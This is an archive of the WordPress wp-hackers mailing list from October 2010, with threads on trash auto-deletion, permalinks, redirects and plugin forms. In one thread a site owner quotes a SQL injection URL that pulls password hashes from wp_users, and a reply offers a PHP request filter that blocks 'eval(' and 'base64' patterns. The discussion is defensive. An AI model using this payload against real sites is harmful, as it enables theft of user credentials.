Date: Tue, 5 Oct 2010 16:23:55 -0400
Subject: [wp-hackers] Never Permanently Delete
In-Reply-To: <AANLkTim674EBFTq0ptRB336QW2cSE6r-FDyiU1nFjMM5@mail.gmail.com>
References: <AANLkTinrkguWiLkv6s2Oci9NDPnAaq_ihJwWwxSnXGZV@mail.gmail.com>
	<AANLkTikhsgH4prYpgYk2R2WiBUo8FG4mUQtGSn_KHtg+@mail.gmail.com>
	<AANLkTimCRb4j0p+DMRkZnTypQx6W4YO4FQ7qvcXim7x5@mail.gmail.com>
	<AANLkTi=4CO2bSYXXygwFk5wXFvqXah0R504N=qzP7f37@mail.gmail.com>
	<AANLkTinWojNN65VLCngmzOU4uFxUaTkXxKY9DeRs3u+9@mail.gmail.com>
	<AANLkTinRqj2F2myjB+KvwCoWk57FTdnWRihnNC+8nOWt@mail.gmail.com>
	<AANLkTim674EBFTq0ptRB336QW2cSE6r-FDyiU1nFjMM5@mail.gmail.com>
Message-ID: <AANLkTin-YxovaA3mEZ7TyWg=GiGaetvD8w9y3A5WH1m_@mail.gmail.com>

On Tue, Oct 5, 2010 at 3:41 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:

> or I can just comment out 2 lines in admin.php to prevent the auto delete
> from scheduling.  I'm actually kinda surprised I haven't had to hack core
> yet with all the changes I am making to my wordpress install.


You should never hack core. Ever.

From rbilesky at gmail.com  Tue Oct  5 20:30:48 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Tue, 5 Oct 2010 13:30:48 -0700
Subject: [wp-hackers] Never Permanently Delete
In-Reply-To: <AANLkTin-YxovaA3mEZ7TyWg=GiGaetvD8w9y3A5WH1m_@mail.gmail.com>
References: <AANLkTinrkguWiLkv6s2Oci9NDPnAaq_ihJwWwxSnXGZV@mail.gmail.com>
	<AANLkTikhsgH4prYpgYk2R2WiBUo8FG4mUQtGSn_KHtg+@mail.gmail.com>
	<AANLkTimCRb4j0p+DMRkZnTypQx6W4YO4FQ7qvcXim7x5@mail.gmail.com>
	<AANLkTi=4CO2bSYXXygwFk5wXFvqXah0R504N=qzP7f37@mail.gmail.com>
	<AANLkTinWojNN65VLCngmzOU4uFxUaTkXxKY9DeRs3u+9@mail.gmail.com>
	<AANLkTinRqj2F2myjB+KvwCoWk57FTdnWRihnNC+8nOWt@mail.gmail.com>
	<AANLkTim674EBFTq0ptRB336QW2cSE6r-FDyiU1nFjMM5@mail.gmail.com>
	<AANLkTin-YxovaA3mEZ7TyWg=GiGaetvD8w9y3A5WH1m_@mail.gmail.com>
Message-ID: <AANLkTimoewQ8HoXNs=-gEzuxT4x-ikepo=Oz2gHikHK=@mail.gmail.com>

meh its a simple enough modification I don;t mind having to redo it when I
update core.

On Tue, Oct 5, 2010 at 1:23 PM, Andrew Nacin <wp at andrewnacin.com> wrote:

> On Tue, Oct 5, 2010 at 3:41 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:
>
> > or I can just comment out 2 lines in admin.php to prevent the auto delete
> > from scheduling.  I'm actually kinda surprised I haven't had to hack core
> > yet with all the changes I am making to my wordpress install.
>
>
> You should never hack core. Ever.
>  _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From esmi at quirm.net  Tue Oct  5 22:09:26 2010
From: esmi at quirm.net (esmi at quirm dot net)
Date: Tue, 05 Oct 2010 23:09:26 +0100
Subject: [wp-hackers] Stop RSS widget pulling own site url
Message-ID: <4CABA216.1090409@quirm.net>

I've now seen 2 of these in the last couple of weeks. One of those "you 
couldn't make it up if you tried" issues:

http://wordpress.org/support/topic/thousands-of-internal-requests-for-site-root?replies=4#post-1726027

Is there any chance that the default RSS widget could be modified in 
core to ignore calls to site_url or home_url?

esmi
-- 
WordPress theme developer
http://quirm.net
http://blackwidows.co.uk

From shawn at crowdfavorite.com  Tue Oct  5 22:48:18 2010
From: shawn at crowdfavorite.com (Shawn Parker)
Date: Tue, 5 Oct 2010 16:48:18 -0600
Subject: [wp-hackers] Never Permanently Delete
In-Reply-To: <AANLkTimoewQ8HoXNs=-gEzuxT4x-ikepo=Oz2gHikHK=@mail.gmail.com>
References: <AANLkTinrkguWiLkv6s2Oci9NDPnAaq_ihJwWwxSnXGZV@mail.gmail.com>
	<AANLkTikhsgH4prYpgYk2R2WiBUo8FG4mUQtGSn_KHtg+@mail.gmail.com>
	<AANLkTimCRb4j0p+DMRkZnTypQx6W4YO4FQ7qvcXim7x5@mail.gmail.com>
	<AANLkTi=4CO2bSYXXygwFk5wXFvqXah0R504N=qzP7f37@mail.gmail.com>
	<AANLkTinWojNN65VLCngmzOU4uFxUaTkXxKY9DeRs3u+9@mail.gmail.com>
	<AANLkTinRqj2F2myjB+KvwCoWk57FTdnWRihnNC+8nOWt@mail.gmail.com>
	<AANLkTim674EBFTq0ptRB336QW2cSE6r-FDyiU1nFjMM5@mail.gmail.com>
	<AANLkTin-YxovaA3mEZ7TyWg=GiGaetvD8w9y3A5WH1m_@mail.gmail.com>
	<AANLkTimoewQ8HoXNs=-gEzuxT4x-ikepo=Oz2gHikHK=@mail.gmail.com>
Message-ID: <B598D4A9-3217-4967-AE8C-3E782EC209E7@crowdfavorite.com>

Until you or someone else forgets, upgrades WP, and BAM! everything you've tried to protect is undone and you're off to your backups to restore the server state.

I haven't tested it, but have you tried: remove_action('wp_scheduled_delete', 'wp_scheduled_delete');

Shawn


On Oct 5, 2010, at 2:30 PM, Ryan Bilesky wrote:

> meh its a simple enough modification I don;t mind having to redo it when I
> update core.
> 
> On Tue, Oct 5, 2010 at 1:23 PM, Andrew Nacin <wp at andrewnacin.com> wrote:
> 
>> On Tue, Oct 5, 2010 at 3:41 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:
>> 
>>> or I can just comment out 2 lines in admin.php to prevent the auto delete
>>> from scheduling.  I'm actually kinda surprised I haven't had to hack core
>>> yet with all the changes I am making to my wordpress install.
>> 
>> 
>> You should never hack core. Ever.
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From wp at andrewnacin.com  Tue Oct  5 23:00:35 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Tue, 5 Oct 2010 19:00:35 -0400
Subject: [wp-hackers] Stop RSS widget pulling own site url
In-Reply-To: <4CABA216.1090409@quirm.net>
References: <4CABA216.1090409@quirm.net>
Message-ID: <AANLkTik+VMMKrKG02JPgCvdwUWig4vxuYv=WKdQHCD-X@mail.gmail.com>

On Tue, Oct 5, 2010 at 6:09 PM, esmi at quirm dot net <esmi at quirm.net>wrote:

> I've now seen 2 of these in the last couple of weeks. One of those "you
> couldn't make it up if you tried" issues:
>
>
> http://wordpress.org/support/topic/thousands-of-internal-requests-for-site-root?replies=4#post-1726027
>
> Is there any chance that the default RSS widget could be modified in core
> to ignore calls to site_url or home_url?
>

http://core.trac.wordpress.org/ticket/8910
http://core.trac.wordpress.org/ticket/11585

From esmi at quirm.net  Tue Oct  5 23:04:13 2010
From: esmi at quirm.net (esmi at quirm dot net)
Date: Wed, 06 Oct 2010 00:04:13 +0100
Subject: [wp-hackers] Stop RSS widget pulling own site url
In-Reply-To: <AANLkTik+VMMKrKG02JPgCvdwUWig4vxuYv=WKdQHCD-X@mail.gmail.com>
References: <4CABA216.1090409@quirm.net>
	<AANLkTik+VMMKrKG02JPgCvdwUWig4vxuYv=WKdQHCD-X@mail.gmail.com>
Message-ID: <4CABAEED.6040209@quirm.net>

on 06/10/2010 00:00 Andrew Nacin said the following:

> http://core.trac.wordpress.org/ticket/8910
> http://core.trac.wordpress.org/ticket/11585

Thanks. My Trac-fu obviously isn't what it should be. :-)

esmi
-- 
WordPress theme developer
http://quirm.net
http://blackwidows.co.uk

From steagl4ml at gmail.com  Wed Oct  6 12:28:17 2010
From: steagl4ml at gmail.com (Stefano Aglietti)
Date: Wed, 6 Oct 2010 14:28:17 +0200
Subject: [wp-hackers] SPecial permalink
Message-ID: <AANLkTik5yX3k-GzAiNJoe_FQkWoLieFE-uRKueBcjd0d@mail.gmail.com>

I want to have main category (not childs) listed in permalink for single
post, I'm gettin a bit mad cause a plugin i found didnt' wok well and throw
tons of 404, I wanna add a new tgs %MAINCAT% to put in permalink structure
that give as result

www.blogname.com/maincat-slug/post-title/P9999/ (where post-title/P9999 is
the actual structure /%postname%/P%post_id%/)

Any help and suggestion? I'm getting mad with rewrite rules and stuff with
no luck...

PS I already have a plugin installed that remove the category tag from
categories permalinks

Thank to all

From johnbillion+wp at gmail.com  Wed Oct  6 15:09:01 2010
From: johnbillion+wp at gmail.com (John Blackbourn)
Date: Wed, 6 Oct 2010 16:09:01 +0100
Subject: [wp-hackers] SPecial permalink
In-Reply-To: <AANLkTik5yX3k-GzAiNJoe_FQkWoLieFE-uRKueBcjd0d@mail.gmail.com>
References: <AANLkTik5yX3k-GzAiNJoe_FQkWoLieFE-uRKueBcjd0d@mail.gmail.com>
Message-ID: <AANLkTikUgigBndvQpQTsAGD29yEc+oR4Ytbn4JvubrQ2@mail.gmail.com>

Don't get mad Stefano, it's not that bad.

Check out the Using Permalinks page on Codex [1], you'll notice
there's a %category% tag available BUT you must realise that your site
can have severe performance issues if you start your permalink with
this tag [2] so you might want to think of a better way to structure
your permalinks.

John

[1] http://codex.wordpress.org/Using_Permalinks
[2] http://www.google.com/search?q=wordpress+category+permalink+performance

On Wed, Oct 6, 2010 at 1:28 PM, Stefano Aglietti <steagl4ml at gmail.com> wrote:
> I want to have main category (not childs) listed in permalink for single
> post, I'm gettin a bit mad cause a plugin i found didnt' wok well and throw
> tons of 404, I wanna add a new tgs %MAINCAT% to put in permalink structure
> that give as result
>
> www.blogname.com/maincat-slug/post-title/P9999/ (where post-title/P9999 is
> the actual structure /%postname%/P%post_id%/)
>
> Any help and suggestion? I'm getting mad with rewrite rules and stuff with
> no luck...
>
> PS I already have a plugin installed that remove the category tag from
> categories permalinks
>
> Thank to all
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From charrisjr at gmail.com  Wed Oct  6 17:59:02 2010
From: charrisjr at gmail.com (Chuck Harris)
Date: Wed, 6 Oct 2010 10:59:02 -0700
Subject: [wp-hackers] WP 3.0.1 Multiple Sites -- SQL Injection Vulnerability
Message-ID: <AANLkTi=Pg97uKnPyHnwdAxfMkUuEk91dCaqfsqoutoE=@mail.gmail.com>

Hello:

Any experience with or insight regarding the following would be helpful.

Thank you in advance,
Chuck Harris

------------

We are experimenting with the new multiple sites feature in WP 3.x.  We
recently discovered that our site has a SQL injection vulnerability.  One of
the attack sequences was as follows:

http://our_site_url.org/index.php?cat=999+UNION+SELECT+null,CONCAT(666,CHAR(58),user_pass,CHAR(58),666,CHAR(58)),null,null,null+FROM+wp_users+where+id=1/*<http://our_site_url.org/index.php?cat=999+UNION+SELECT+null,CONCAT%28666,CHAR%2858%29,user_pass,CHAR%2858%29,666,CHAR%2858%29%29,null,null,null+FROM+wp_users+where+id=1/*>

When changing the 1 to a 2 and using the url:

http://our_site_url.org/index.php?cat=999+UNION+SELECT+null,CONCAT(666,CHAR(58),user_pass,CHAR(58),666,CHAR(58)),null,null,null+FROM+wp_users+where+id=2/*<http://our_site_url.org/index.php?cat=999+UNION+SELECT+null,CONCAT%28666,CHAR%2858%29,user_pass,CHAR%2858%29,666,CHAR%2858%29%29,null,null,null+FROM+wp_users+where+id=2/*>

Returns a custom 'Not Found' page. This change shows that the server is
returning different data based upon the results of the sql string it is
passed.

Has anyone else experienced similar?  Is there a remedy?  Should we be
concerned?  We are currently searching log files to determine whether or not
the attack was successful.

From otto at ottodestruct.com  Wed Oct  6 18:27:04 2010
From: otto at ottodestruct.com (Otto)
Date: Wed, 6 Oct 2010 13:27:04 -0500
Subject: [wp-hackers] WP 3.0.1 Multiple Sites -- SQL Injection
	Vulnerability
In-Reply-To: <AANLkTi=Pg97uKnPyHnwdAxfMkUuEk91dCaqfsqoutoE=@mail.gmail.com>
References: <AANLkTi=Pg97uKnPyHnwdAxfMkUuEk91dCaqfsqoutoE=@mail.gmail.com>
Message-ID: <AANLkTinryKmKg_mBkbv0Sm0PEULUswOTO1HwYGaGi_fh@mail.gmail.com>

Sounds like somebody is just trying old attacks. The "cat" SQL
injection was fixed years ago.
http://core.trac.wordpress.org/ticket/2758

The reason you get a different result is easy: You don't have a
category with the ID of "2". The injection isn't working, because the
cat parameter is getting cleaned up before the query gets run.

-Otto



On Wed, Oct 6, 2010 at 12:59 PM, Chuck Harris <charrisjr at gmail.com> wrote:
> Hello:
>
> Any experience with or insight regarding the following would be helpful.
>
> Thank you in advance,
> Chuck Harris
>
> ------------
>
> We are experimenting with the new multiple sites feature in WP 3.x. ?We
> recently discovered that our site has a SQL injection vulnerability. ?One of
> the attack sequences was as follows:
>
> http://our_site_url.org/index.php?cat=999+UNION+SELECT+null,CONCAT(666,CHAR(58),user_pass,CHAR(58),666,CHAR(58)),null,null,null+FROM+wp_users+where+id=1/*<http://our_site_url.org/index.php?cat=999+UNION+SELECT+null,CONCAT%28666,CHAR%2858%29,user_pass,CHAR%2858%29,666,CHAR%2858%29%29,null,null,null+FROM+wp_users+where+id=1/*>
>
> When changing the 1 to a 2 and using the url:
>
> http://our_site_url.org/index.php?cat=999+UNION+SELECT+null,CONCAT(666,CHAR(58),user_pass,CHAR(58),666,CHAR(58)),null,null,null+FROM+wp_users+where+id=2/*<http://our_site_url.org/index.php?cat=999+UNION+SELECT+null,CONCAT%28666,CHAR%2858%29,user_pass,CHAR%2858%29,666,CHAR%2858%29%29,null,null,null+FROM+wp_users+where+id=2/*>
>
> Returns a custom 'Not Found' page. This change shows that the server is
> returning different data based upon the results of the sql string it is
> passed.
>
> Has anyone else experienced similar? ?Is there a remedy? ?Should we be
> concerned? ?We are currently searching log files to determine whether or not
> the attack was successful.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From philip at frumph.net  Wed Oct  6 18:31:17 2010
From: philip at frumph.net (Philip M. Hofer (Frumph))
Date: Wed, 6 Oct 2010 11:31:17 -0700
Subject: [wp-hackers] WP 3.0.1 Multiple Sites -- SQL Injection
	Vulnerability
In-Reply-To: <AANLkTi=Pg97uKnPyHnwdAxfMkUuEk91dCaqfsqoutoE=@mail.gmail.com>
References: <AANLkTi=Pg97uKnPyHnwdAxfMkUuEk91dCaqfsqoutoE=@mail.gmail.com>
Message-ID: <64E01D2BFB054945AA1950D71F515E89@frumph.net>

Hey chuck, I came across this bit of info that you would probably like to 
use to 'ease your mind' sort of thinking.

http://www.the-web-mechanic.com/category/wordpress-security/

#9

<?php /* Plugin Name: Block Bad Queries */

if (strlen($_SERVER['REQUEST_URI']) > 255 ||
     strpos($_SERVER['REQUEST_URI'], "eval(") ||
 strpos($_SERVER['REQUEST_URI'], "base64")) {
          @header("HTTP/1.1 414 Request-URI Too Long");
          @header("Status: 414 Request-URI Too Long");
          @header("Connection: Close");
          @exit;
} ?>


You should probably adjust the strlen to something a little lower if 
necessary or add an || for concat( or char(




----- Original Message ----- 
From: "Chuck Harris" <charrisjr at gmail.com>
To: <wp-hackers at lists.automattic.com>
Sent: Wednesday, October 06, 2010 10:59 AM
Subject: [wp-hackers] WP 3.0.1 Multiple Sites -- SQL Injection Vulnerability


> Hello:
>
> Any experience with or insight regarding the following would be helpful.
>
> Thank you in advance,
> Chuck Harris
>
> ------------
>
> We are experimenting with the new multiple sites feature in WP 3.x.  We
> recently discovered that our site has a SQL injection vulnerability.  One 
> of
> the attack sequences was as follows:
>
> http://our_site_url.org/index.php?cat=999+UNION+SELECT+null,CONCAT(666,CHAR(58),user_pass,CHAR(58),666,CHAR(58)),null,null,null+FROM+wp_users+where+id=1/*<http://our_site_url.org/index.php?cat=999+UNION+SELECT+null,CONCAT%28666,CHAR%2858%29,user_pass,CHAR%2858%29,666,CHAR%2858%29%29,null,null,null+FROM+wp_users+where+id=1/*>
>
> When changing the 1 to a 2 and using the url:
>
> http://our_site_url.org/index.php?cat=999+UNION+SELECT+null,CONCAT(666,CHAR(58),user_pass,CHAR(58),666,CHAR(58)),null,null,null+FROM+wp_users+where+id=2/*<http://our_site_url.org/index.php?cat=999+UNION+SELECT+null,CONCAT%28666,CHAR%2858%29,user_pass,CHAR%2858%29,666,CHAR%2858%29%29,null,null,null+FROM+wp_users+where+id=2/*>
>
> Returns a custom 'Not Found' page. This change shows that the server is
> returning different data based upon the results of the sql string it is
> passed.
>
> Has anyone else experienced similar?  Is there a remedy?  Should we be
> concerned?  We are currently searching log files to determine whether or 
> not
> the attack was successful.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 



From nacin at wordpress.org  Thu Oct  7 03:20:32 2010
From: nacin at wordpress.org (Andrew Nacin)
Date: Wed, 6 Oct 2010 23:20:32 -0400
Subject: [wp-hackers] WP 3.0.1 Multiple Sites -- SQL Injection
	Vulnerability
In-Reply-To: <AANLkTi=Pg97uKnPyHnwdAxfMkUuEk91dCaqfsqoutoE=@mail.gmail.com>
References: <AANLkTi=Pg97uKnPyHnwdAxfMkUuEk91dCaqfsqoutoE=@mail.gmail.com>
Message-ID: <AANLkTinB=aYt8LYvx0PqqAWdCPGvOyEm+P+FOv5E048t@mail.gmail.com>

On Wed, Oct 6, 2010 at 1:59 PM, Chuck Harris <charrisjr at gmail.com> wrote:

> Hello:
>
> Any experience with or insight regarding the following would be helpful.
>
> Thank you in advance,
> Chuck Harris


In the future, I would have thought it were obvious, but:
Don't send potential vulnerabilities over a public mailing list or post it
to a public place.

It should go through the core team at security at wordpress.org.

See also: http://codex.wordpress.org/FAQ_Security.

Thanks,
Nacin

From chris at 314media.com  Thu Oct  7 04:11:15 2010
From: chris at 314media.com (Chris Carter)
Date: Wed, 6 Oct 2010 23:11:15 -0500
Subject: [wp-hackers] redirection problem
Message-ID: <AANLkTim8KY=pW_G0PqRLv=pr9XbSEzkQFJNNkMeai3rY@mail.gmail.com>

I've got a site that need needs to use some 301 redirection.

The problem is that the old site used a different URL structure
(this.aspx?cat=120) and when I type in that URL (since it's not in the
database) I get a 404 page.

Does anyone have any ideas?

The .htaccess method doesnt work because that content is not in the DB.  I
tried the redirection plugin and killed my original rewrite rules and
notihng worked...

-- 
Chris

From zachbrowne at gmail.com  Thu Oct  7 05:11:43 2010
From: zachbrowne at gmail.com (Zach Browne)
Date: Thu, 7 Oct 2010 00:11:43 -0500
Subject: [wp-hackers] redirection problem
In-Reply-To: <AANLkTim8KY=pW_G0PqRLv=pr9XbSEzkQFJNNkMeai3rY@mail.gmail.com>
References: <AANLkTim8KY=pW_G0PqRLv=pr9XbSEzkQFJNNkMeai3rY@mail.gmail.com>
Message-ID: <AANLkTik1AzTO7AFD3e-uOmCb3hemLvU0Qx823+2+4pyi@mail.gmail.com>

Are you using permalinks on your new WordPress installation?

Zach Browne
http://zachbrowne.com


On Wed, Oct 6, 2010 at 11:11 PM, Chris Carter <chris at 314media.com> wrote:

> I've got a site that need needs to use some 301 redirection.
>
> The problem is that the old site used a different URL structure
> (this.aspx?cat=120) and when I type in that URL (since it's not in the
> database) I get a 404 page.
>
> Does anyone have any ideas?
>
> The .htaccess method doesnt work because that content is not in the DB.  I
> tried the redirection plugin and killed my original rewrite rules and
> notihng worked...
>
> --
> Chris
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From haulyn at yahoo.com  Thu Oct  7 08:47:03 2010
From: haulyn at yahoo.com (Haulyn Jason)
Date: Thu, 7 Oct 2010 01:47:03 -0700 (PDT)
Subject: [wp-hackers] How to use formand link in plugin development?
Message-ID: <856699.60925.qm@web120204.mail.ne1.yahoo.com>

Hi, all:

I am developing a plugin, I design a form, but I do not know the form action 
rule. my form script is slackissspider.php, my logic is 
slackissspider-action.php. They are in one folder( the plugin folder). Now I can 
not find any reference to write <form action="??">, the related path does not 
work.

Any solutions or reference is very useful, Thanks very much.

Haulyn Jason


      

From ozh at ozh.org  Thu Oct  7 09:01:15 2010
From: ozh at ozh.org (Ozh)
Date: Thu, 7 Oct 2010 11:01:15 +0200
Subject: [wp-hackers] How to use formand link in plugin development?
In-Reply-To: <856699.60925.qm@web120204.mail.ne1.yahoo.com>
Message-ID: <OF2E775AB5.350F904A-ONC12577B5.003147AB-C12577B5.00318DB8@notes.edfgdf.fr>

The WordPress Settings API:
http://codex.wordpress.org/Settings_API

More tutorials & examples:
<http://ottopress.com/2009/wordpress-settings-api-tutorial/>
<http://planetozh.com/blog/2009/05/handling-plugins-options-in-wordpress-28-with-register_setting/>

> Hi, all:
> 
> I am developing a plugin, I design a form, but I do not know the form 
action 
> rule. my form script is slackissspider.php, my logic is 
> slackissspider-action.php. They are in one folder( the plugin 
> folder). Now I can 
> not find any reference to write <form action="??">, the related pathdoes 
not 
> work.
> 
> Any solutions or reference is very useful, Thanks very much.
> 
> Haulyn Jason
> 

Ozh
-- 
http://ozh.org/


From haulyn at yahoo.com  Thu Oct  7 11:11:34 2010
From: haulyn at yahoo.com (Haulyn Jason)
Date: Thu, 7 Oct 2010 04:11:34 -0700 (PDT)
Subject: [wp-hackers] How to use formand link in plugin development?
In-Reply-To: <OF2E775AB5.350F904A-ONC12577B5.003147AB-C12577B5.00318DB8@notes.edfgdf.fr>
References: <OF2E775AB5.350F904A-ONC12577B5.003147AB-C12577B5.00318DB8@notes.edfgdf.fr>
Message-ID: <324027.23356.qm@web120210.mail.ne1.yahoo.com>

Thanks, Ozh,
My problem is not render something new in options page, I design a new page, 
then need to use form in this new page. I didn't find any reference, if I 
am careless, so it's sorry, but I really do not find any solutions.
 Thanks!


http://www.vvthumb.com

Location:Room 807,QiLuRuanJianDaSha Qilu Software Park
No. 1 Shunhua Rd High-Tech Development Zone
Jinan, China 250101
Website: http://www.haulynjason.net
Mobile: +86 15854103759


Haulyn Jason




________________________________
From: Ozh <ozh at ozh.org>
To: wp-hackers at lists.automattic.com
Sent: Thu, October 7, 2010 5:01:15 PM
Subject: Re: [wp-hackers] How to use formand link in plugin development?

The WordPress Settings API:
http://codex.wordpress.org/Settings_API

More tutorials & examples:
<http://ottopress.com/2009/wordpress-settings-api-tutorial/>
<http://planetozh.com/blog/2009/05/handling-plugins-options-in-wordpress-28-with-register_setting/>


> Hi, all:
> 
> I am developing a plugin, I design a form, but I do not know the form 
action 
> rule. my form script is slackissspider.php, my logic is 
> slackissspider-action.php. They are in one folder( the plugin 
> folder). Now I can 
> not find any reference to write <form action="??">, the related pathdoes 
not 
> work.
> 
> Any solutions or reference is very useful, Thanks very much.
> 
> Haulyn Jason
> 

Ozh
-- 
http://ozh.org/

_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers



      

From haulyn at yahoo.com  Thu Oct  7 13:31:14 2010
From: haulyn at yahoo.com (Haulyn Jason)
Date: Thu, 7 Oct 2010 06:31:14 -0700 (PDT)
Subject: [wp-hackers] How to use formand link in plugin development?
In-Reply-To: <324027.23356.qm@web120210.mail.ne1.yahoo.com>
References: <OF2E775AB5.350F904A-ONC12577B5.003147AB-C12577B5.00318DB8@notes.edfgdf.fr>
	<324027.23356.qm@web120210.mail.ne1.yahoo.com>
Message-ID: <181895.41125.qm@web120212.mail.ne1.yahoo.com>

I solve it now, but hard code. Maybe there is a better way?
 Thanks!


http://www.vvthumb.com


Location:Room 807,QiLuRuanJianDaSha Qilu Software Park
No. 1 Shunhua Rd High-Tech Development Zone
Jinan, China 250101
Website: http://www.haulynjason.net
Mobile: +86 15854103759


Haulyn Jason




________________________________
From: Haulyn Jason <haulyn at yahoo.com>
To: wp-hackers at lists.automattic.com
Sent: Thu, October 7, 2010 7:11:34 PM
Subject: Re: [wp-hackers] How to use formand link in plugin development?

Thanks, Ozh,
My problem is not render something new in options page, I design a new page, 
then need to use form in this new page. I didn't find any reference, if I 
am careless, so it's sorry, but I really do not find any solutions.
Thanks!


http://www.vvthumb.com

Location:Room 807,QiLuRuanJianDaSha Qilu Software Park
No. 1 Shunhua Rd High-Tech Development Zone
Jinan, China 250101
Website: http://www.haulynjason.net
Mobile: +86 15854103759


Haulyn Jason




________________________________
From: Ozh <ozh at ozh.org>
To: wp-hackers at lists.automattic.com
Sent: Thu, October 7, 2010 5:01:15 PM
Subject: Re: [wp-hackers] How to use formand link in plugin development?

The WordPress Settings API:
http://codex.wordpress.org/Settings_API

More tutorials & examples:
<http://ottopress.com/2009/wordpress-settings-api-tutorial/>
<http://planetozh.com/blog/2009/05/handling-plugins-options-in-wordpress-28-with-register_setting/>



> Hi, all:
> 
> I am developing a plugin, I design a form, but I do not know the form 
action 
> rule. my form script is slackissspider.php, my logic is 
> slackissspider-action.php. They are in one folder( the plugin 
> folder). Now I can 
> not find any reference to write <form action="??">, the related pathdoes 
not 
> work.
> 
> Any solutions or reference is very useful, Thanks very much.
> 
> Haulyn Jason
> 

Ozh
-- 
http://ozh.org/

_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers



      
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers



      

From gaarai at gaarai.com  Thu Oct  7 13:59:34 2010
From: gaarai at gaarai.com (Chris Jean)
Date: Thu, 07 Oct 2010 08:59:34 -0500
Subject: [wp-hackers] How to use formand link in plugin development?
In-Reply-To: <181895.41125.qm@web120212.mail.ne1.yahoo.com>
References: <OF2E775AB5.350F904A-ONC12577B5.003147AB-C12577B5.00318DB8@notes.edfgdf.fr>	<324027.23356.qm@web120210.mail.ne1.yahoo.com>
	<181895.41125.qm@web120212.mail.ne1.yahoo.com>
Message-ID: <4CADD246.7050307@gaarai.com>

In my humble opinion, you are going about solving this the wrong way 
around. You shouldn't have the form send data directly to your script. 
Rather, you should have a form submission handler in your code that runs 
inside WordPress.

To give you an example of this, I'd like to know if you have this form 
on the back-end (admin form) or front-end (for a site visitor to fill out).

Chris Jean (AKA gaarai&  chrisbliss18)
Coder for http://ithemes.com/
http://gaarai.com/
@chrisjean


On 10/07/2010 08:31 AM, Haulyn Jason wrote:
> I solve it now, but hard code. Maybe there is a better way?
>   Thanks!
>    
>> I am developing a plugin, I design a form, but I do not know the form action rule. my form script is slackissspider.php, my logic is
>> slackissspider-action.php. They are in one folder( the plugin folder). Now I can not find any reference to write<form action="??">, the related pathdoes not work.
>>
>> Any solutions or reference is very useful, Thanks very much.
>>
>> Haulyn Jason

From gaarai at gaarai.com  Thu Oct  7 15:40:03 2010
From: gaarai at gaarai.com (Chris Jean)
Date: Thu, 07 Oct 2010 10:40:03 -0500
Subject: [wp-hackers] Patch to validate option and transient name lengths
Message-ID: <4CADE9D3.5080008@gaarai.com>

I just created a new ticket and patch that proposes an idea for option 
and transient name length validation. Without validation, tracking some 
bugs and/or code misbehavior can be difficult.

I would love for those interested to weigh in on the idea.

http://core.trac.wordpress.org/ticket/15058

-- 
Chris Jean (AKA gaarai&  chrisbliss18)
Coder for http://ithemes.com/
http://gaarai.com/
@chrisjean


From haulyn at yahoo.com  Fri Oct  8 01:18:14 2010
From: haulyn at yahoo.com (Haulyn Jason)
Date: Thu, 7 Oct 2010 18:18:14 -0700 (PDT)
Subject: [wp-hackers] How to use formand link in plugin development?
In-Reply-To: <4CADD246.7050307@gaarai.com>
References: <OF2E775AB5.350F904A-ONC12577B5.003147AB-C12577B5.00318DB8@notes.edfgdf.fr>
	<324027.23356.qm@web120210.mail.ne1.yahoo.com>
	<181895.41125.qm@web120212.mail.ne1.yahoo.com>
	<4CADD246.7050307@gaarai.com>
Message-ID: <367138.73819.qm@web120220.mail.ne1.yahoo.com>

Hi, Chris,

Thanks for your reply, my script is for admin panel, just for administrator.
 Thanks!


http://www.vvthumb.com


Location:Room 807,QiLuRuanJianDaSha Qilu Software Park
No. 1 Shunhua Rd High-Tech Development Zone
Jinan, China 250101
Website: http://www.haulynjason.net
Mobile: +86 15854103759


Haulyn Jason




________________________________
From: Chris Jean <gaarai at gaarai.com>
To: wp-hackers at lists.automattic.com
Sent: Thu, October 7, 2010 9:59:34 PM
Subject: Re: [wp-hackers] How to use formand link in plugin development?

In my humble opinion, you are going about solving this the wrong way around. You 
shouldn't have the form send data directly to your script. Rather, you should 
have a form submission handler in your code that runs inside WordPress.

To give you an example of this, I'd like to know if you have this form on the 
back-end (admin form) or front-end (for a site visitor to fill out).

Chris Jean (AKA gaarai&  chrisbliss18)
Coder for http://ithemes.com/
http://gaarai.com/
@chrisjean


On 10/07/2010 08:31 AM, Haulyn Jason wrote:
> I solve it now, but hard code. Maybe there is a better way?
>   Thanks!
>    
>> I am developing a plugin, I design a form, but I do not know the form action 
>>rule. my form script is slackissspider.php, my logic is
>> slackissspider-action.php. They are in one folder( the plugin folder). Now I 
>>can not find any reference to write<form action="??">, the related pathdoes not 
>>work.
>> 
>> Any solutions or reference is very useful, Thanks very much.
>> 
>> Haulyn Jason
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers



      

From hempsworth at gmail.com  Fri Oct  8 02:29:52 2010
From: hempsworth at gmail.com (Alex Hempton-Smith)
Date: Fri, 8 Oct 2010 03:29:52 +0100
Subject: [wp-hackers] Remove useless usermeta
